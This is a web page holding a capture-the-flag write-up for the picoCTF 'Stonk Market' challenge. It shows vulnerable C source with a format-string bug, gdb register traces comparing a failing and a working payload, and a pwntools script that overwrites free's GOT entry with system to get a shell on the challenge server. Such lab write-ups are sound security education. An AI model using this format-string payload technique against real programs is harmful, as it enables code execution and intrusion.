<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  PicoCTF - Stonk Market
  #


  Background
  #

FMT

  Source code
  #

:::spoiler
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don&#39;t own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = &#39;A&#39; + (rand() % 26);
		} else {
			stonk->symbol[i] = &#39;\0&#39;;
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	/*
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
	*/
	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &amp;resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stonk-market/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PicoCTF - Stonk Market"><meta property="og:description" content='PicoCTF - Stonk Market # Background # FMT
Source code # :::spoiler
#include <stdlib.h> #include <stdio.h> #include <string.h> #include <time.h> #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int view_portfolio(Portfolio *p) { if (!p) { return 1; } printf("\nPortfolio as of "); fflush(stdout); system("date"); // TODO: implement this in C fflush(stdout); printf("\n\n"); Stonk *head = p->head; if (!head) { printf("You don&#39;t own any stonks!\n"); } while (head) { printf("%d shares of %s\n", head->shares, head->symbol); head = head->next; } return 0; } Stonk *pick_symbol_with_AI(int shares) { if (shares < 1) { return NULL; } Stonk *stonk = malloc(sizeof(Stonk)); stonk->shares = shares; int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1; for (int i = 0; i <= MAX_SYM_LEN; i++) { if (i < AI_symbol_len) { stonk->symbol[i] = &#39;A&#39; + (rand() % 26); } else { stonk->symbol[i] = &#39;\0&#39;; } } stonk->next = NULL; return stonk; } int buy_stonks(Portfolio *p) { if (!p) { return 1; } /* char api_buf[FLAG_BUFFER]; FILE *f = fopen("api","r"); if (!f) { printf("Flag file not found\n"); exit(1); } fgets(api_buf, FLAG_BUFFER, f); */ int money = p->money; int shares = 0; Stonk *temp = NULL; printf("Using patented AI algorithms to buy stonks\n"); while (money > 0) { shares = (rand() % money) + 1; temp = pick_symbol_with_AI(shares); temp->next = p->head; p->head = temp; money -= shares; } printf("Stonks chosen\n"); char *user_buf = malloc(300 + 1); printf("What is your API token?\n"); scanf("%300s", user_buf); printf("Buying stonks with token:\n"); printf(user_buf); // TODO: Actually use key to interact with API view_portfolio(p); return 0; } Portfolio *initialize_portfolio() { Portfolio *p = malloc(sizeof(Portfolio)); p->money = (rand() % 2018) + 1; p->head = NULL; return p; } void free_portfolio(Portfolio *p) { Stonk *current = p->head; Stonk *next = NULL; while (current) { next = current->next; free(current); current = next; } free(p); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); srand(time(NULL)); Portfolio *p = initialize_portfolio(); if (!p) { printf("Memory failure\n"); exit(1); } int resp = 0; printf("Welcome back to the trading app!\n\n"); printf("What would you like to do?\n"); printf("1) Buy some stonks!\n"); printf("2) View my portfolio\n"); scanf("%d", &amp;resp); if (resp == 1) { buy_stonks(p); } else if (resp == 2) { view_portfolio(p); } free_portfolio(p); printf("Goodbye!\n"); exit(0); } :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="PicoCTF"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>PicoCTF - Stonk Market | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stonk-market/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PicoCTF - Stonk Market</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#analysis>Analysis</a></li><li><a href=#exploit---fmt>Exploit - FMT</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=picoctf---stonk-market>PicoCTF - Stonk Market
<a class=anchor href=#picoctf---stonk-market>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>FMT</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp=">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf(&#34;\nPortfolio as of &#34;);
	fflush(stdout);
	system(&#34;date&#34;); // TODO: implement this in C
	fflush(stdout);

	printf(&#34;\n\n&#34;);
	Stonk *head = p-&gt;head;
	if (!head) {
		printf(&#34;You don&#39;t own any stonks!\n&#34;);
	}
	while (head) {
		printf(&#34;%d shares of %s\n&#34;, head-&gt;shares, head-&gt;symbol);
		head = head-&gt;next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares &lt; 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk-&gt;shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i &lt;= MAX_SYM_LEN; i++) {
		if (i &lt; AI_symbol_len) {
			stonk-&gt;symbol[i] = &#39;A&#39; + (rand() % 26);
		} else {
			stonk-&gt;symbol[i] = &#39;\0&#39;;
		}
	}

	stonk-&gt;next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	/*
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen(&#34;api&#34;,&#34;r&#34;);
	if (!f) {
		printf(&#34;Flag file not found\n&#34;);
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
	*/
	int money = p-&gt;money;
	int shares = 0;
	Stonk *temp = NULL;
	printf(&#34;Using patented AI algorithms to buy stonks\n&#34;);
	while (money &gt; 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp-&gt;next = p-&gt;head;
		p-&gt;head = temp;
		money -= shares;
	}
	printf(&#34;Stonks chosen\n&#34;);

	char *user_buf = malloc(300 + 1);
	printf(&#34;What is your API token?\n&#34;);
	scanf(&#34;%300s&#34;, user_buf);
	printf(&#34;Buying stonks with token:\n&#34;);
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p-&gt;money = (rand() % 2018) + 1;
	p-&gt;head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p-&gt;head;
	Stonk *next = NULL;
	while (current) {
		next = current-&gt;next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf(&#34;Memory failure\n&#34;);
		exit(1);
	}

	int resp = 0;

	printf(&#34;Welcome back to the trading app!\n\n&#34;);
	printf(&#34;What would you like to do?\n&#34;);
	printf(&#34;1) Buy some stonks!\n&#34;);
	printf(&#34;2) View my portfolio\n&#34;);
	scanf(&#34;%d&#34;, &amp;resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf(&#34;Goodbye!\n&#34;);

	exit(0);
}
</code></pre><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題是參考了<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>，可以看到source code中的buy_stonks function出現format string bug，我一開始看了很久，以為這一題是和heap有關的問題</p><p><sup id=fnref1:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>的做法是：
先把free的got address(0x602018)利用fmt寫到某一個位置，然後再改變got指向的位置(0x4006c6)，變成指向system的位置(0x4006f0)，再把<code>sh\x00</code>的string寫到某一個chunk中，之後當call到free並且要free掉我們指定的那個chunk時，他就會執行<code>system(sh\x00)</code>，成功執行shell</p><h2 id=analysis>Analysis
<a class=anchor href=#analysis>#</a></h2><p>當程式執行到<code>&lt;printf_positional+7716> mov BYTE PTR [rax], bl</code>(如下)時，可以看一下rax數值在register中應對不同payload時的變化，我把完整的trace stack放在這一段的最下面，有興趣trace的人可以參考一下</p><pre tabindex=0><code>   0x7ffff7e40bb4 &lt;printf_positional+7700&gt; test   r12d, r12d
   0x7ffff7e40bb7 &lt;printf_positional+7703&gt; je     0x7ffff7e40f1e &lt;printf_positional+8574&gt;
   0x7ffff7e40bbd &lt;printf_positional+7709&gt; movzx  ebx, BYTE PTR [rbp-0x8a4]
 → 0x7ffff7e40bc4 &lt;printf_positional+7716&gt; mov    BYTE PTR [rax], bl
   0x7ffff7e40bc6 &lt;printf_positional+7718&gt; jmp    0x7ffff7e3fa29 &lt;printf_positional+3209&gt;
   0x7ffff7e40bcb &lt;printf_positional+7723&gt; mov    r10d, DWORD PTR [rbx+rax*1]
   0x7ffff7e40bcf &lt;printf_positional+7727&gt; test   r12d, r12d
   0x7ffff7e40bd2 &lt;printf_positional+7730&gt; je     0x7ffff7e40f34 &lt;printf_positional+8596&gt;
   0x7ffff7e40bd8 &lt;printf_positional+7736&gt; movsx  r10, r10b
</code></pre><ul><li>==Incorrect Payload:== <code>%6299672c%12$n%216c%20$hhn%10504067c%10$n</code>遇到的問題
:::spoiler Register<pre tabindex=0><code>$rdi   : 0x0
$rax   : 0x0
$r8    : 0xffffffff
$rbx   : 0xf0
$rcx   : 0x00007ffff7f78f40  →  0x0000000000000000
$r13   : 0x0
$r10   : 0x00007fffffffa580  →  0x00000000f7fb8723
$r12   : 0x1
$r14   : 0x00007fffffffa248  →  0x00000000ffffffff
$r9    : 0x0
$rbp   : 0x00007fffffffa9d0  →  0x00007fffffffaf90  →  0x00007fffffffd670
$rip   : 0x00007ffff7e40bc4  →  &lt;printf_positional+7716&gt; mov BYTE PTR [rax], bl
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$rdx   : 0x00007ffff7e3f42a  →  &lt;printf_positional+1674&gt; endbr64
$r15   : 0x00007fffffffafc0  →  0x00000000fbad8004
$rsi   : 0x00007fffffffa580  →  0x00000000f7fb8723
$r11   : 0x6e
$rsp   : 0x00007fffffffa060  →  0x0000000000000000
$gs: 0x00 $fs: 0x00 $es: 0x00 $cs: 0x33 $ss: 0x2b $ds: 0x00
</code></pre>:::</li></ul><ul><li>==Correct Payload:== <code>%c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%10$n</code>
:::spoiler Register<pre tabindex=0><code>$rdi   : 0x0
$rax   : 0x0000000000602018  →  0x00000000004006c6  →  0xffe0e90000000068 (&#34;h&#34;?)
$r8    : 0xffffffff
$rbx   : 0xf0
$rcx   : 0x00007ffff7f78f40  →  0x0000000000000000
$r13   : 0x0
$r10   : 0x00007fffffffa580  →  0x00000000f7fb8723
$r12   : 0x1
$r14   : 0x0000000000603cf8  →  0x00000000ffffffff
$r9    : 0x0
$rbp   : 0x00007fffffffa9d0  →  0x00007fffffffaf90  →  0x00007fffffffd670
$rip   : 0x00007ffff7e40bc4  →  &lt;printf_positional+7716&gt; mov BYTE PTR [rax], bl
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$rdx   : 0x00007ffff7e3f42a  →  &lt;printf_positional+1674&gt; endbr64
$r15   : 0x00007fffffffafc0  →  0x00000000fbad8004
$rsi   : 0x00007fffffffa580  →  0x00000000f7fb8723
$r11   : 0x6e
$rsp   : 0x00007fffffffa060  →  0x0000000000000000
$gs: 0x00 $fs: 0x00 $es: 0x00 $cs: 0x33 $ss: 0x2b $ds: 0x00
</code></pre>:::
可以看到<code>0x7ffff7e40bc4 mov BYTE PTR [rax], bl</code>準備把0xf0的值放到rax指向的位置，但是如果是第一種payload，rax的value是0，而第二種payload所存放的value才是0x602018，所以這應該就是@ccccctw所提到的問題，一開始把<code>0x602018</code>寫入<code>0x00007fffffffd7d0</code>之前都還是零，所以第二種payload因為某種關係，他可以先把<code>0x602018</code>寫入<code>0x00007fffffffd7d0</code>，==再==把<code>0x602018</code>指向的<code>0x4006c6</code>最後一個byte改掉，而不是像第一種payload一樣，是同時執行所有的動作，導致系統還沒有把<code>0x602018</code>寫入<code>0x00007fffffffd7d0</code>，想當然<code>0x00007fffffffd7d0</code>的value也是零</li></ul><pre tabindex=0><code>...
0x00007fffffffd790│+0x0030: 0x00007fffffffd7d0  →  0x0000000000000000    ← $rbp
...
0x00007fffffffd7d0│+0x0070: 0x0000000000000000
</code></pre><hr><p>:::spoiler 完整的trace stack</p><pre tabindex=0><code>gef➤  bt 10
#0  0x00007ffff7e40bc4 in printf_positional (s=s@entry=0x7fffffffafc0, format=format@entry=0x603730 &#34;%6299672c%12$n%216c%20$hhn%10504067c%10$n&#34;, readonly_format=readonly_format@entry=0x0, ap=ap@entry=0x7fffffffd680, ap_savep=ap_savep@entry=0x7fffffffab48, done=&lt;optimized out&gt;, nspecs_done=&lt;optimized out&gt;, lead_str_end=&lt;optimized out&gt;, work_buffer=&lt;optimized out&gt;, save_errno=&lt;optimized out&gt;, grouping=&lt;optimized out&gt;, thousands_sep=&lt;optimized out&gt;, mode_flags=&lt;optimized out&gt;) at vfprintf-internal.c:2072
#1  0x00007ffff7e41dcd in __vfprintf_internal (s=s@entry=0x7fffffffafc0, format=0x603730 &#34;%6299672c%12$n%216c%20$hhn%10504067c%10$n&#34;, ap=0x7fffffffd680, mode_flags=&lt;optimized out&gt;) at vfprintf-internal.c:1733
#2  0x00007ffff7e44ea2 in buffered_vfprintf (s=s@entry=0x7ffff7fb86a0 &lt;_IO_2_1_stdout_&gt;, format=format@entry=0x603730 &#34;%6299672c%12$n%216c%20$hhn%10504067c%10$n&#34;, args=args@entry=0x7fffffffd680, mode_flags=mode_flags@entry=0x0) at vfprintf-internal.c:2377
#3  0x00007ffff7e41d24 in __vfprintf_internal (s=0x7ffff7fb86a0 &lt;_IO_2_1_stdout_&gt;, format=0x603730 &#34;%6299672c%12$n%216c%20$hhn%10504067c%10$n&#34;, ap=ap@entry=0x7fffffffd680, mode_flags=mode_flags@entry=0x0) at vfprintf-internal.c:1346
#4  0x00007ffff7e2cd3f in __printf (format=&lt;optimized out&gt;) at printf.c:33
#5  0x0000000000400ace in buy_stonks ()
#6  0x0000000000400c66 in main ()
</code></pre><p>:::</p><h2 id=exploit---fmt>Exploit - FMT
<a class=anchor href=#exploit---fmt>#</a></h2><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

if args.LOCAL:
    r = process(&#39;./vuln&#39;)
else:
    r = remote(&#39;mercury.picoctf.net&#39;, 5654)

payload = &#39;%c&#39;*10 + &#39;%6299662c&#39; + &#39;%n&#39; + &#39;%216c&#39; + &#39;%20$hhn&#39; + &#39;%10504067c&#39; + &#39;%10$n&#39;

r.sendline(b&#39;1&#39;)
raw_input()
r.sendlineafter(b&#34;token?&#34;, payload.encode())
r.interactive()
</code></pre><p>Flag: <code>picoCTF{explo1t_m1t1gashuns_641dcdf1}</code></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://youtu.be/gLFJFXpY44w>picoCTF 2021 Stonk Market </a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref1:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#analysis>Analysis</a></li><li><a href=#exploit---fmt>Exploit - FMT</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>